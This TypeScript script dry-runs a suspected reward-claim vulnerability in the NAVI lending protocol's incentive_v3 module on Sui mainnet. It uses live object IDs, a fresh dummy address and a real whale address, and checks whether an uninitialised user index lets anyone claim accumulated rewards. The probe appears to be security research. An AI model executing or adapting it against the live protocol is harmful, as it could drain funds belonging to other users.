/**
 * NAVI v3 incentive_v3::claim_reward_entry — dry-run vulnerability test
 *
 * Architecture discovered:
 *   - RewardFund<T> is a SHARED object (anyone can reference it)
 *   - claim_reward_entry(Clock, Incentive, Storage, RewardFund<T>, Vector<String>, Vector<Address>)
 *     where Vector<String> = coin type strings, Vector<Address> = rule IDs
 *   - Sender (TxContext) = the user claiming
 *   - Rule.user_index Table: if user not in table → defaults to 0 → full historical reward
 *
 * CRITICAL: RewardFund is SHARED → anyone can call claim_reward_entry!
 * This is different from v1: v1 has IncentiveBal (shared), v3 has RewardFund (also shared)
 */

import { SuiClient } from "@mysten/sui/client";
import { Transaction } from "@mysten/sui/transactions";

const client = new SuiClient({ url: "https://fullnode.mainnet.sui.io:443" });

// Protocol objects
const CLOCK = "0x0000000000000000000000000000000000000000000000000000000000000006";
const INCENTIVE_V3 = "0x62982dad27fb10bb314b3384d5de8d2ac2d72ab2dbeae5d801dbdb9efa816c80";
const STORAGE = "0xbb4e2f4b6205c2e2a2db47aeb4f830796ec7c005f88537ee775986639bc442fe";

// MID_PKG (the package version actually being called in real txs)
const PKG = "0x81c408448d0d57b3e371ea94de1d40bf852784d3e225de1e74acab3e8395c18f";
const PROTO_PKG = "0xee0041239b89564ce870a7dec5ddc5d114367ab94a1137e90aa0633cb76518e0";

// RewardFund<CERT> — confirmed SHARED object
const REWARD_FUND_CERT = "0x7093cf7549d5e5b35bfde2177223d1050f71655c7f676a5e610ee70eb4d93b5c";
const CERT_TYPE = "0x549e8b69270defbfafd4f94e17ec44cdbdd99820b33bda2278dea3b9a32d3f55::cert::CERT";

// CERT pool rules (from events)
const CERT_RULE_1 = "0xda416fe656205ece152240771fe58b301d0c9a0ae43817b7f0cc0faa2742a60e";
const CERT_RULE_2 = "0xae82946d6cae4d5e7a779325394959fd7c2505405de71b2c01a2aac6ec3ab9da";

// USDC coin type (second string in the event's coin_type array)
const USDC_TYPE = "0xdba34672e30cb065b1f93e3ab55318768fd6fef66c15942c9f7cb846e2f900e7::usdc::USDC";

// Users for testing
const DUMMY = "0x0000000000000000000000000000000000000000000000000000000000001337";
const NAVI_WHALE = "0x7861f12c652dbcf96589413cf5cbc5ebcccd85c2c9f09c25fee76f2a218195c9";

// The real claimer from the observed event
const REAL_CLAIMER = "0x374e0ef6e83118c22735dbb34d6c762b7bf26197757b6918086bedb65310fab3";

async function checkRuleUserIndex(ruleId: string, user: string) {
  // Try to find user's index in rule's user_index Table
  // The rule is embedded in Incentive, so we access via INCENTIVE_V3 → pool → rule
  const iv3 = await client.getObject({ id: INCENTIVE_V3, options: { showContent: true } });
  const pools = (iv3.data?.content as any)?.fields?.pools?.fields?.contents ?? [];

  // Find CERT pool (key contains "cert")
  for (const pool of pools) {
    const key = String(pool?.fields?.key ?? "");
    if (key.includes("549e8b69") || key.includes("cert")) {
      const rules = pool?.fields?.value?.fields?.rules?.fields?.contents ?? [];
      for (const r of rules) {
        if (r?.fields?.key === ruleId) {
          const ruleFields = r?.fields?.value?.fields ?? {};
          const tableId = ruleFields.user_index?.fields?.id?.id;
          if (!tableId) return null;

          try {
            const entry = await client.getDynamicFieldObject({
              parentId: tableId,
              name: { type: "address", value: user },
            });
            const val = (entry.data?.content as any)?.fields?.value;
            return val ?? "NOT_FOUND_IN_TABLE";
          } catch {
            return "NOT_IN_TABLE (defaults to 0)";
          }
        }
      }
    }
  }
  return "RULE_NOT_FOUND";
}

async function testClaim(sender: string, label: string) {
  console.log(`\n=== Dry-run: ${label} ===`);
  console.log(`  Sender: ${sender.slice(0, 24)}...`);

  // Check user_index for this sender
  const idx1 = await checkRuleUserIndex(CERT_RULE_1, sender);
  console.log(`  user_index[rule1]: ${idx1}`);

  const tx = new Transaction();
  tx.setSender(sender);

  // coin types vector<string>
  const coinTypes = [CERT_TYPE, USDC_TYPE];
  // rule IDs vector<address>
  const ruleIds = [CERT_RULE_1, CERT_RULE_2];

  tx.moveCall({
    target: `${PKG}::incentive_v3::claim_reward_entry`,
    typeArguments: [CERT_TYPE],
    arguments: [
      tx.object(CLOCK),
      tx.object(INCENTIVE_V3),
      tx.object(STORAGE),
      tx.object(REWARD_FUND_CERT),
      tx.pure.vector("ascii", coinTypes),     // Vector<ascii::String>
      tx.pure.vector("address", ruleIds),     // Vector<Address>
    ],
  });

  const r = await client.devInspectTransactionBlock({ transactionBlock: tx, sender });
  const status = r.effects?.status?.status;
  const error = r.effects?.status?.error ?? "";

  console.log(`  Status: ${status}`);
  if (status === "success") {
    const events = r.events?.filter((e: any) => e.type.includes("RewardClaimed")) ?? [];
    if (events.length > 0) {
      const pj = events[0].parsedJson as any;
      console.log("  ✅ RewardClaimed event:");
      console.log(`    user: ${pj.user}`);
      console.log(`    total_claimed: ${pj.total_claimed}`);
      console.log(`    rule_indices: ${JSON.stringify(pj.rule_indices)}`);
    } else {
      console.log("  ✅ Success (no RewardClaimed event emitted)");
      const returns = r.results ?? [];
      console.log(`  Returns: ${returns.length} commands`);
    }
  } else {
    console.log(`  Error: ${error.slice(0, 200)}`);
    const fnName = error.match(/function_name: Some\("([^"]+)"\)/)?.[1];
    const code = error.match(/}, (\d+)\)/)?.[1];
    if (fnName) console.log(`  → Aborted in ${fnName}() code=${code}`);
    if (error.includes("version")) console.log("  → VERSION GUARD fires (safe)");
  }
}

async function main() {
  console.log("=".repeat(60));
  console.log("  NAVI v3 claim_reward_entry — Vulnerability Test (DRY-RUN)");
  console.log("=".repeat(60));

  // Check RewardFund<CERT> balance
  const rf = await client.getObject({ id: REWARD_FUND_CERT, options: { showContent: true } });
  const rff = (rf.data?.content as any)?.fields ?? {};
  console.log(`\nRewardFund<CERT> balance: ${rff.balance} (${(Number(rff.balance ?? 0) / 1e9).toFixed(4)} tokens)`);

  // Test 1: Real claimer (to verify our call works)
  await testClaim(REAL_CLAIMER, "Real claimer (verification)");

  // Test 2: Fresh DUMMY address (VULNERABILITY TEST)
  await testClaim(DUMMY, "DUMMY fresh address (uninitialized user_index)");

  // Test 3: NAVI whale (has existing deposits)
  await testClaim(NAVI_WHALE, "NAVI whale");
}
main().catch(console.error);
